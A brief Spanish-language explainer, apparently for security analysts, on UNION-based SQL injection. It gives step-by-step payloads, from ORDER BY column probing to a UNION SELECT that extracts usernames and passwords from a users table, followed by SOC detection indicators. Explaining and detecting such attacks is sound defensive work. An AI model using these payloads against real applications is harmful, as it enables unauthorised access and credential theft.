# SQL Injection Basada en UNION

La técnica UNION permite combinar resultados de múltiples consultas SQL.

Un atacante puede usarla para extraer datos arbitrarios.

## Pasos típicos

1. Descubrir el número de columnas:
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
3. Probar UNION:
1' UNION SELECT null--
3. Ajustar columnas:
1' UNION SELECT null, null--
4. Extraer datos:
1' UNION SELECT username, password FROM users--

## Indicadores SOC

- presencia de `UNION SELECT`
- columnas NULL repetidas
- consultas a tablas sensibles
